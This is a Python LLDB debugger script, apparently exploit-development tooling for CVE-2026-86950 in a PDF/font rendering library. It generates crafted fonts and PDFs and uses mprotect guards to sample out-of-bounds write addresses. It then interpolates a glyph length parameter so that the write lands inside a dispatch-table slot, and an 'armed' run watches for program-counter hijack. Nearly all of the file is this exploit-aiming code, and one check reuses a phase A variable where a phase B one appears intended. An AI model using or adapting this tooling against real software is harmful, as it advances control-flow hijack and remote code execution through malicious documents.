# RIP-26: IN-PROCESS ADAPTIVE AIM.
# A: K=12 chains (L=30400..31104 step 64), ONE decode, stable x27.
#    Guard the dispatch-table page; every strike = one fa(L) sample.
#    Interpolate L* that lands fa INSIDE the slot range.
# B: armed run at L* (single chain): catch strike INSIDE slots, unguard,
#    continue -> watch for PC consumption (crash at glyph value).
import os, sys, struct, subprocess, time
import lldb
t = lldb.debugger.GetSelectedTarget()
CWD = os.getcwd()
CVE = os.path.dirname(CWD) + "/cve-2026-86950"
sys.path.insert(0, CVE)
TRACE = open(os.path.join(CWD, "rip26_trace.txt"), "a")
def T(s): print(s, flush=True); TRACE.write(s+"\n"); TRACE.flush()
err = lldb.SBError()

def qwords(p, addr, n):
    if addr < 0x100000: return None
    m = p.ReadMemory(addr, n*8, err)
    if not err.Success() or not m: return None
    return [struct.unpack('<Q', m[i*8:i*8+8])[0] for i in range(n)]

def fresh():
    old = t.GetProcess()
    if old and old.IsValid() and old.GetState() in (lldb.eStateRunning, lldb.eStateStopped, lldb.eStateSuspended):
        old.Kill(); time.sleep(0.2)

def wait_stop(p, budget=25):
    p.Continue()
    st = p.GetState()
    t0 = time.time()
    while st == lldb.eStateRunning:
        if time.time() - t0 > budget:
            try: p.Stop(); time.sleep(0.5); st = p.GetState()
            except Exception: pass
            if st == lldb.eStateRunning:
                try: p.Kill()
                except Exception: pass
                return lldb.eStateKilled
            return st
        time.sleep(0.1); st = p.GetState()
    return st

def killp(p):
    try:
        if p and p.IsValid() and p.GetState() in (lldb.eStateRunning, lldb.eStateStopped, lldb.eStateSuspended):
            p.Kill()
    except Exception: pass

def safe_pc_addr(fr):
    try:
        a = fr.GetPCAddress().GetLoadAddress(t)
        if a is None or a < 0 or a >= (1 << 48): return None
        return a
    except Exception: return None

def pcoff(fr):
    a = safe_pc_addr(fr)
    try:
        if fr.GetSymbol() and a:
            return a - fr.GetSymbol().GetStartAddress().GetLoadAddress(t)
    except Exception: pass
    return -1

def codeish(q):
    return 0x100000000 <= q < 0x800000000 and (q & 3) == 0

def find_table(p, x27):
    best = None; bestn = 0; bestoff = -1
    for base in range(x27 - 0x9000, x27 + 0x6000, 0x1000):
        page = base & ~0xFFF
        qs = qwords(p, page, 0x1000//8)
        if not qs: continue
        n = sum(1 for q in qs if codeish(q))
        if n > bestn:
            off = -1
            for j in range(len(qs) - 8):
                if sum(1 for q in qs[j:j+16] if codeish(q)) >= 8:
                    off = j*8; break
            bestn = n; best = page; bestoff = off
    return best, bestn, bestoff

LS = [30400 + 64*i for i in range(12)]
subprocess.run(['./venv/bin/python', os.path.join(CVE, 'gen_kN.py')] + [str(L) for L in LS],
               cwd=CVE, capture_output=True)
T("A font built Ls=%s" % LS)

fresh()
be = t.BreakpointCreateByName("aa_cache_render"); be.SetOneShot(True)
p = t.LaunchSimple(["kN.pdf", "r.png"], None, CVE)
samples = []
x27 = 0; tp = 0; slot_lo = 0; slot_hi = 0
guarded = False; walkstops = 0; catchcount = 0
if p and p.IsValid():
    th = p.GetSelectedThread()
    pc0 = safe_pc_addr(th.GetSelectedFrame())
    bw = t.BreakpointCreateByAddress(pc0 + 1804) if pc0 else 0
    for i in range(400):
        st = wait_stop(p)
        if st != lldb.eStateStopped: break
        fr = p.GetSelectedThread().GetSelectedFrame()
        off = pcoff(fr)
        desc = p.GetSelectedThread().GetStopDescription(300) or ""
        if off == 1804:
            walkstops += 1
            if x27 == 0:
                x27 = fr.FindRegister("x27").GetValueAsUnsigned()
                tp, n, soff = find_table(p, x27)
                if tp and soff >= 0:
                    slot_lo = tp + soff; slot_hi = slot_lo + 0xC0
                    T("A x27=%x table=%x slots=[%x..%x] (n=%d)" % (x27, tp, slot_lo, slot_hi, n))
                else:
                    T("A no-table x27=%x (n=%d)" % (x27, n)); break
            if not guarded and catchcount < 60:
                tpA = tp & ~0xFFF
                v = t.EvaluateExpression('(int)mprotect((void*)%d, 4096, 1)' % tpA)
                guarded = (v.GetValueAsSigned() == 0)
            p.Continue()
        elif "EXC_BAD_ACCESS" in desc and guarded:
            fa = 0
            if "address=" in desc:
                try: fa = int(desc.split("address=")[1].split(")")[0], 16)
                except Exception: pass
            rw = "W" if "code=2" in desc else "R"
            if slot_lo <= fa < slot_lo + 0x1000:
                zone = "INSIDE" if slot_lo <= fa < slot_hi else "PAGE"
                x0 = fr.FindRegister("x0").GetValueAsUnsigned()
                samples.append((walkstops, off, fa, rw, zone, x0))
                T("A ws=%d site+%d %s fa=%x zone=%s x0=%x" % (walkstops, off, rw, fa, zone, x0))
                catchcount += 1
            v = t.EvaluateExpression('(int)mprotect((void*)%d, 4096, 3)' % (tp & ~0xFFF))
            guarded = (v.GetValueAsSigned() == 0)
            p.Continue()
        else:
            p.Continue()
    killp(p)
    if bw: t.BreakpointDelete(bw.GetID())
t.BreakpointDelete(be.GetID())
T("A walkstops=%d samples=%d" % (walkstops, len(samples)))

# map walkstop->chain: est levels/chain from total walkstops (K chains)
lpc = max(1, walkstops // 12) if walkstops else 1
T("A est levels/chain=%d" % lpc)
pt_samples = []
for ws, off, fa, rw, zone, x0 in samples:
    if rw != "W": continue
    chain = min(11, ws // lpc)
    d = fa - x27
    pt_samples.append((chain, LS[chain], d, zone, off))
    T("A PT chain=%d L=%d delta=%d zone=%s site+%d" % (chain, LS[chain], d, zone, off))

# interpolate L* : want delta = slot_mid - x27
LSTAR = None
if pt_samples and x27:
    slot_mid = (slot_lo + slot_hi) // 2
    want = slot_mid - x27
    # nearest sample bracketing want
    best = None
    for j in range(len(pt_samples) - 1):
        (c1, L1, d1, z1, o1), (c2, L2, d2, z2, o2) = pt_samples[j], pt_samples[j+1]
        if (d1 - want) * (d2 - want) <= 0 and L1 != L2:
            LSTAR = L1 + (want - d1) * (L2 - L1) // (d2 - d1)
            T("A interp between L=%d(d=%d) and L=%d(d=%d) -> L*=%d (want=%d)" % (L1, d1, L2, d2, LSTAR, want))
            break
    if not LSTAR:
        near = min(pt_samples, key=lambda s: abs(s[2] - want))
        LSTAR = near[1]
        T("A nearest L=%d d=%d want=%d -> L*=%d" % (near[1], near[2], want, LSTAR))

# ---- PHASE-B: armed run at L* ----
LSTAR = max(1, min(32767, LSTAR or 31472))
T("B armed L*=%d" % LSTAR)
subprocess.run(['./venv/bin/python', '-c',
    "import sys; sys.path.insert(0,'.'); from gen_k2 import build_font; build_font('kb.ttf', %d)" % LSTAR], cwd=CVE, capture_output=True)
subprocess.run(['./venv/bin/python', 'gen_pdf.py', 'kb.pdf', 'kb.ttf'], cwd=CVE, capture_output=True)
fresh()
be = t.BreakpointCreateByName("aa_cache_render"); be.SetOneShot(True)
p = t.LaunchSimple(["kb.pdf", "r.png"], None, CVE)
if p and p.IsValid():
    th = p.GetSelectedThread()
    pc0 = safe_pc_addr(th.GetSelectedFrame())
    bw = t.BreakpointCreateByAddress(pc0 + 1804) if pc0 else 0
    x27b = 0; wh = 0; hit = False
    for i in range(300):
        st = wait_stop(p)
        if st != lldb.eStateStopped:
            T("B end st=%s rc=%s" % (st, p.GetExitStatus() if p.IsValid() else -1)); break
        fr = p.GetSelectedThread().GetSelectedFrame()
        off = pcoff(fr)
        desc = p.GetSelectedThread().GetStopDescription(300) or ""
        if off == 1804:
            wh += 1
            if x27b == 0:
                x27b = fr.FindRegister("x27").GetValueAsUnsigned()
                tp2, n2, soff2 = find_table(p, x27b)
                if tp2 and soff >= 0:
                    slot_lo2 = tp2 + soff2; slot_hi2 = slot_lo2 + 0xC0
                    T("B x27=%x slots=[%x..%x]" % (x27b, slot_lo2, slot_hi2))
                    v = t.EvaluateExpression('(int)mprotect((void*)%d, 4096, 1)' % (tp2 & ~0xFFF))
                    T("B guard mprot=%d" % v.GetValueAsSigned())
            p.Continue()
        elif "EXC_BAD_ACCESS" in desc and x27b:
            fa = 0
            if "address=" in desc:
                try: fa = int(desc.split("address=")[1].split(")")[0], 16)
                except Exception: pass
            rw = "W" if "code=2" in desc else "R"
            if rw == "W" and not hit and slot_lo2 <= fa < slot_lo2 + 0x1000:
                zone = "INSIDE" if slot_lo2 <= fa < slot_hi2 else "PAGE"
                x0 = fr.FindRegister("x0").GetValueAsUnsigned()
                hit = True
                T("B STRIKE site+%d fa=%x zone=%s value-x0=%x" % (off, fa, zone, x0))
                # slot index + neighbors before corruption
                if zone == "INSIDE":
                    si = (fa - slot_lo2) // 8
                    qs = qwords(p, slot_lo2, 24)
                    T("B slot[%d] pre: %s" % (si, [hex(q) for q in (qs or [])]))
                # unguard and let the store land + decode continue (PC attempt)
                v = t.EvaluateExpression('(int)mprotect((void*)%d, 4096, 3)' % (tp2 & ~0xFFF))
                T("B unguard mprot=%d -> decode continues (PC watch)" % v.GetValueAsSigned())
                p.Continue()
            else:
                v = t.EvaluateExpression('(int)mprotect((void*)%d, 4096, 3)' % (tp2 & ~0xFFF))
                p.Continue()
        else:
            # non-fault stop after strike? pc check for consumption
            if hit:
                pc = safe_pc_addr(fr)
                T("B post-strike stop off=%d pc=%x %s" % (off, pc or 0, desc[:60]))
            p.Continue()
    killp(p)
    if bw: t.BreakpointDelete(bw.GetID())
t.BreakpointDelete(be.GetID())
T("RIP-26 DONE")
TRACE.close()
